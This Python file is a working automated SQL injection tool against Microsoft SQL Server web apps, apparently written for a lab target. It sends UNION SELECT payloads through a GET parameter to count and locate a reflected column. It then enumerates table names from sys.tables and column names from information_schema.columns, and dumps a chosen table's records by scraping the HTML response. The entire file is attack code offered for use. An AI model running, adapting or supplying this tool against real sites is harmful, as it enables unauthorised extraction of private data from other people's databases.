import re
import requests
from bs4 import BeautifulSoup

_URL = ""
_GET_param = ""
_Table = None
_Column = None
def set_params(url,param,table,column=""):
    global _URL, _GET_param, _Table, _Column
    _URL = url
    _GET_param = param
    _Table = table
    _Column = column

payloadDBMS = {
        "tables_name" : ["name","www_project.sys.tables"],
        "columns_name" : ["column_name","information_schema.columns"]
    }

def createPayload(field,value="978-1-49192-706-9"):
    payload = field + "=" + value
    return payload
def send_request(payload):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "ngrok-skip-browser-warning": "foo"
    }
    response = requests.get(_URL, headers=headers, params=payload)
    return response

def countColumnNumber():
    add = ""; value_head = "'+UNION+SELECT+"; value_tail = "null--"; count = 1
    while(1):
        value = value_head + add + value_tail
        payload = createPayload(_GET_param,value)
        response = send_request(payload)
        check = response.text.find('<!DOCTYPE html>')
        if(check == 0): break
        add = add + "null,"; count += 1
    return value,count
def split_payload_null(text):
    text = text.replace(",", " ")
    parts = re.split(r'(null)', text)
    return [p.strip() for p in parts if p.strip()]
def join_payload_null(text):
    return "".join(text).replace("nullnull", "null,null").replace("nullnull", "null,null").replace("nullnull", "null,null")
def findTypeColumn(value,columnNum=0):
    array_of_payload = split_payload_null(value)
    array_of_string = []
    for i in range(1,columnNum+1):
        array_of_payload_temp = array_of_payload.copy()
        if(i==1) : array_of_payload_temp[i] = "'foobarZZZ',"
        elif(i<columnNum) : array_of_payload_temp[i] = ",'foobarZZZ',"
        else : array_of_payload_temp[i] = ",'foobarZZZ'"

        value = join_payload_null(array_of_payload_temp)
        payload = createPayload(_GET_param,value)
        response = send_request(payload)
        if "Can't retrieve data: Array" not in response.text:
            array_of_string.append(i)
    return array_of_string,array_of_payload.copy() #[1,2,3],["'+UNION+SELECT+","null",...,"null","--"]
def choseColumnToInjection(array_of_payload,columnNum,text,lastText="--",columnIndex=1):
    array_of_payload_temp = array_of_payload.copy()
    if(columnIndex==1) : array_of_payload_temp[columnIndex] = f"{text},"
    elif(columnIndex<columnNum) : array_of_payload_temp[columnIndex] = f",{text},"
    else : array_of_payload_temp[columnIndex] = f",{text}"
    array_of_payload_temp[-1] = lastText
    value = join_payload_null(array_of_payload_temp)
    payload = createPayload(_GET_param,value)
    return payload #'UNION+SELECT+null,...,null--

# Get data by dom path
def get_dom_path(element):
    """Lấy đường dẫn DOM của một phần tử."""
    path = []
    while element:
        parent = element.parent
        if not parent:
            break
        siblings = parent.find_all(element.name, recursive=False)
        index = siblings.index(element) + 1 if len(siblings) > 1 else ''
        tag = f"{element.name}{f':nth-of-type({index})' if index else ''}"
        path.insert(0, tag)
        element = parent
    return ' > '.join(path)
def find_text_and_get_path(html, text):
    """Tìm thẻ chứa text và trả về đường dẫn DOM."""
    soup = BeautifulSoup(html, 'html.parser')
    element = soup.find(string=lambda s: text in s)
    return get_dom_path(element.parent) if element else None
def parse_dom_path(path):
    """Chuyển đường dẫn DOM thành danh sách selector và index."""
    parts = path.split(" > ")
    parsed_parts = []
    for part in parts:
        match = re.match(r"(\w+)(?:\:nth-of-type\((\d+)\))?", part)
        if match:
            tag = match.group(1)
            index = int(match.group(2)) - 1 if match.group(2) else None
            parsed_parts.append((tag, index))
    return parsed_parts
def get_value_from_path(html, path):
    """Lấy giá trị từ đường dẫn DOM."""
    soup = BeautifulSoup(html, 'html.parser')
    parsed_path = parse_dom_path(path)
    current_elements = [soup]
    for tag, index in parsed_path:
        next_elements = []
        for el in current_elements:
            found_elements = el.find_all(tag, recursive=False)
            if index is not None:
                if index < len(found_elements):
                    next_elements.append(found_elements[index])
            else:
                next_elements.extend(found_elements)
        if not next_elements:
            return None
        current_elements = next_elements
    return current_elements[0].get_text(strip=True) if current_elements else None

def revealTable(dom_path,array_of_payload,count):
    tables_list = []
    payload = choseColumnToInjection(array_of_payload,count,f"COUNT({payloadDBMS['tables_name'][0]})",
                                     f"+FROM+{payloadDBMS['tables_name'][1]}+ORDER+BY+1+OFFSET+0+ROW+FETCH+NEXT+1+ROW+ONLY--")
    response_count = send_request(payload)
    valueCount = get_value_from_path(response_count.text,dom_path)
    if(valueCount is not None):
        countTable = int(valueCount.strip())  # Loại bỏ khoảng trắng trước khi chuyển đổi
    else: countTable = 0  # Nếu không tìm thấy giá trị, đặt về None

    for i in range(0,countTable):
        payload = choseColumnToInjection(array_of_payload,count,payloadDBMS["tables_name"][0],
                                        f"+FROM+{payloadDBMS['tables_name'][1]}+ORDER+BY+1+OFFSET+{i}+ROW+FETCH+NEXT+1+ROW+ONLY--")
        response = send_request(payload)
        tables_list.append(get_value_from_path(response.text,dom_path))
    return tables_list

def revealColumnIn(table,dom_path,array_of_payload,count):
    columns_list = []
    payload = choseColumnToInjection(array_of_payload,count,f"COUNT({payloadDBMS['columns_name'][0]})",
                                     f"+FROM+{payloadDBMS['columns_name'][1]}+WHERE+table_name='{table}'+ORDER+BY+1+OFFSET+0+ROW+FETCH+NEXT+1+ROW+ONLY--")
    response_count = send_request(payload)
    valueCount = get_value_from_path(response_count.text,dom_path)
    if(valueCount is not None):
        countColumn = int(valueCount.strip())  # Loại bỏ khoảng trắng trước khi chuyển đổi
    else: countColumn = 0  # Nếu không tìm thấy giá trị, đặt về None

    for i in range(0,countColumn):
        payload = choseColumnToInjection(array_of_payload,count,payloadDBMS["columns_name"][0],
                                        f"+FROM+{payloadDBMS['columns_name'][1]}+WHERE+table_name='{table}'+ORDER+BY+1+OFFSET+{i}+ROW+FETCH+NEXT+1+ROW+ONLY--")
        response = send_request(payload)
        columns_list.append(get_value_from_path(response.text,dom_path))
    return columns_list

def revealRecordIn(table,columns,dom_path,array_of_payload,count):
    columns = (columns+"").split(",")
    record_list = [[] for _ in range(len(columns))]
    for I in range(len(columns)):
        payload = choseColumnToInjection(array_of_payload,count,f"COUNT({columns[I]})",
                                        f"+FROM+{table}+ORDER+BY+1+OFFSET+0+ROW+FETCH+NEXT+1+ROW+ONLY--")
        response_count = send_request(payload)
        valueCount = get_value_from_path(response_count.text,dom_path)
        if(valueCount is not None):
            countRecord = int(valueCount.strip())  # Loại bỏ khoảng trắng trước khi chuyển đổi
        else: countRecord = 0  # Nếu không tìm thấy giá trị, đặt về None
    
        for i in range(0,countRecord):
            payload = choseColumnToInjection(array_of_payload,count,f"{columns[I]}+COLLATE+Latin1_General_CI_AS",
                                            f"+FROM+{table}+ORDER+BY+1+OFFSET+{i}+ROW+FETCH+NEXT+1+ROW+ONLY--")
            response = send_request(payload)
            record_value = get_value_from_path(response.text, dom_path)
            record_list[I].append(record_value if record_value is not None else "")
    return record_list

def reveal_MSSQL(table = _Table,column = _Column):
    tables = []
    columns = []
    records = []
    value,count = countColumnNumber()
    _,array_of_payload = findTypeColumn(value,count)
    payload_default = choseColumnToInjection(array_of_payload,count,"'fooBAR'")
    response_default = send_request(payload_default)
    dom_path = find_text_and_get_path(response_default.text,"fooBAR")
    if((table is None) and (column is None)):
        tables.append(revealTable(dom_path,array_of_payload,count))
        return tables
    elif(column is None):
        columns.append(revealColumnIn(table,dom_path,array_of_payload,count))
        return columns
    else: 
        records.append(revealRecordIn(table,column,dom_path,array_of_payload,count))
        return records